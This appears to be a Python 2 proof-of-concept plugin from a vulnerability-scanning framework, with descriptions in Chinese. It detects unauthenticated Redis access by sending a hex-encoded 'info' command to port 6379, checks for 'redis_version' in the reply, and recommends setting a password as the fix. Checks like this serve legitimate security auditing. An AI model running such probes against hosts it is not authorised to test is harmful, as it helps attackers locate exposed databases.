#!/usr/bin/python
# -*- coding: UTF-8 -*-
'''
@Author：W2n1ck
@Index：http://www.w2n1ck.com/
'''
import sys
sys.path.append("../..")
import argparse
import socket
from flask.poc_frame import base_poc
from flask.common.util.string_inject_dic import str_inject_dic, string_to_dic, dic_to_string


class Poc(base_poc.BasePoc):
    def __init__(self):
        super(Poc, self).__init__()
        self.init_info()
        self.init_options()
        super(Poc, self).check_config()

    def init_info(self):
        self.info = super(Poc, self).get_info()
        name = "redis未授权访问"
        imp_version = "所有版本"
        description = "redis配置不当,导致未授权访问,参考链接<a href='http://www.freebuf.com/vuls/85021.html'>www.freebuf.com/vuls/85021.html</a>"
        repair = "为redis配置好帐号密码"
        type = base_poc.BugType.WEAK_PWD
        tempinfo = {"type": type, "repair": repair, "name": name, "imp_version": imp_version, "description": description}
        self.info = dict(self.info, **tempinfo)

    def init_options(self):
        self.options = {"port": 6379, 'host': ''}

    def verify(self, use_parser=True):
        result = {}
        result['target'] = ""
        result['info'] = ""
        result['error'] = []
        result['details'] = ""
        result['status'] = False
        result['details'] = {}  # plugin, result
        result['pluginname'] = self.info['name']
        args = (use_parser == True and self.help() or argparse.Namespace(target=None, port=None))
        target = (args.target == None and self.options['host'] or args.target)
        port = (args.port == None and self.options['port'] or args.port)
        redisSocket = None
        try:
            result['target'] = "{}:{}".format(target, port)
            payload = "\x2a\x31\x0d\x0a\x24\x34\x0d\x0a\x69\x6e\x66\x6f\x0d\x0a"
            redisSocket = socket.socket()
            redisSocket.settimeout(3)
            redisSocket.connect((target, port))
            redisSocket.send(payload)
            recvdata = redisSocket.recv(1024)
            if recvdata and 'redis_version' in recvdata:
                result['status'] = True
                result['info'] = "{}存在redis未授权访问".format(target)
                result['details']['plugin'] = self.info
        except Exception ,e:
            if (result['error'].count(str(e)) == 0):
                result['error'].append(str(e))
        finally:
            if redisSocket:
                redisSocket.close()
                del redisSocket
        return result

    def help(self):
        parser = argparse.ArgumentParser(description='插件帮助文档')
        parser.add_argument("-t", "--target", type = str, required=False, help="目标 eg:www.baidu.net")
        parser.add_argument("-p", "--port", required=False, type = int,
                            help="端口 eg:6379 ")
        parser.add_argument("-i", "--info", required=False, action="store_true",
                            help="插件详细信息")
        args = parser.parse_args()
        return args

if __name__ == "__main__":
    base_poc.main(Poc())
